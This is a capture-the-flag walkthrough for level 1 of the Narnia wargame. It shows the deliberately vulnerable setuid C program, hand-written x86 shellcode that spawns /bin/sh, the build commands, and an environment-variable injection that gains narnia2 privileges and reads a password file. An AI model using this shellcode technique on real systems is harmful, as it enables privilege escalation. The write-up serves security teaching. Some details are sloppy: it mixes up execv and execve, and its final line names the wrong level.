__Narnia :: Level 1__
================


_Caleb Stewart_ | _Friday, January 15th, 2016_ 


> The goal of this level is for you to hijack a SETUID executable by injecting shell code for it to run. The executable you are attempting to exploit is /narnia/narnia1. It is owned by the user narnia2, and has the SETUID bit set. This means that when another user runs the program, the program will recieve an effective user id of narnia2, allowing it to act as the narnia2 user.

> The password for the next level is stored in /etc/narnia_pass/narnia2, which is only readable by the narnia2 user.


----------

If we run the narnia1 executable, we find it prompts us to place some shell code in the `EGG` environment variable to run, as seen below.

```
narnia1@melinda:~$ /narnia/narnia1
Give me something to execute at the env-variable EGG
```

This seems pretty straightforward. All we need to do is modify the EGG environment variable with the right shellcode, and the executable will do the work for us. If you don't understand how this works, we can take a walk over to the source code for this challenge.

```
/*
	GNU GPL omitted...
*/
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```

It appears that if we provide the program with a value for EGG, it will simply attempt to execute it as if it were compiled code. There are a few different ways to generate the code to place in EGG. In general, we need code which will be stand alone, and not reference any memory addresses, because we have no way of knowing them. We also need access to a shell started by this process. This sounds a lot like execv. The execve function has a prototype of:

```
int execv(const char *path, char *const argv[]);
```

 We can craft a little bit of assembly to call execv, passing in /bin/sh, without referencing any memory except constant values and the stack. Here's the assembly we will use:

```
xor    %eax,%eax
imul   %ecx
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   $0x6969692d
mov    %esp,%esi
push   %eax
push   %esi
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80
```

This might look a little odd, but that's because we don't call execv using the normal method. Here, we use `int $0x80` in order to call the function. This is because execv is a system call, and linux system calls are access via interrupt number 0x80 (128d). The parameters are first pushed onto the stack. The strings are represented by hexadecimal numbers, and then the stack pointer is used to find values for the parameters. The actual pointers (path, and argv) are stored in esi, and ebx. The function number (system call number) for execv is 0xb, therefore we store 0xb in the al register to tell the kernel which function to call. You should write this code to a file in the /tmp directory. I'll call it /tmp/shellcode.s.

Once we have our assembly written, we must compile this to a flat binary data. Depending which syntax you used for the assembly, we can either us the Gnu Assembler (`as`) or `nasm`. In our case, we used AT&T syntax, so we will use the Gnu Assembler. To compile this to a flat binary file, we can use the following command:

```
$ as --32 -o /tmp/shellcode.o /tmp/shellcode.s
$ ld -m elf_i386 -Ttext 0 --oformat binary -o /tmp/shellcode.bin /tmp/shellcode.o
```

The contents of shellcode.bin are now what we need to place into our environment variable. The simplest way to do this is to use the `cat` command with the backticks:

```
export EGG=`cat /tmp/shellcode.bin`
```

With that, we can now run /narnia/narnia1. If we run it now, we should get the following output.

```
Something about executing EGG
$
```

That dollar sign means it worked! You can now try using the command `whoami`, which should tell you that you are operating as the narnia2 user. With these privileges, simply use `cat` to see the contents /etc/narnia_pass/narnia2, and you will have the password. Congratualations! You just solved Level 2 of the Narnia Wargame!